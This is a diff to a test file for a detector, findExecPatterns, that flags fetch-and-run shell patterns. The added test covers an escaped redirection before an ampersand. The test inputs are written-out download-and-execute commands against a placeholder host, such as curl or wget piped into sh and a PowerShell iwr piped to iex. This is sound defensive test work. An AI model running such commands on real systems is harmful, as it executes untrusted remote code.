@@ -156,6 +156,10 @@ describe("Vercel review of the performance commit", () => {
     expect(findExecPatterns("iwr https://x.invalid/a.ps1 |\u00a0iex").map((h) => h.rule)).toContain("powershell-iex");
     expect(findExecPatterns("curl https://x.invalid/i |\u2003sh").map((h) => h.rule)).toContain("curl-pipe-shell");
   });
+  it("01M81HBH284HKWT0GEWW9E0R55: an escaped \\> before & is a literal, so the & still separates", () => {
+    expect(findExecPatterns("echo curl \\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).toContain("download-then-run");
+    expect(findExecPatterns("curl x \\\\>& wget https://x.invalid/i.sh && sh i.sh").map((h) => h.rule)).not.toContain("download-then-run");
+  });
   it("01M81GX5A9BKY6BCFZMZ8N3CCT: a redirection's & does not split the command", () => {
     for (const t of ["curl https://x.invalid 2>&1 -o /tmp/a && sh /tmp/a", "curl https://x.invalid &>/dev/null -o /tmp/a; bash /tmp/a"]) expect(findExecPatterns(t).map((h) => h.rule), t).toContain("download-then-run");
   });
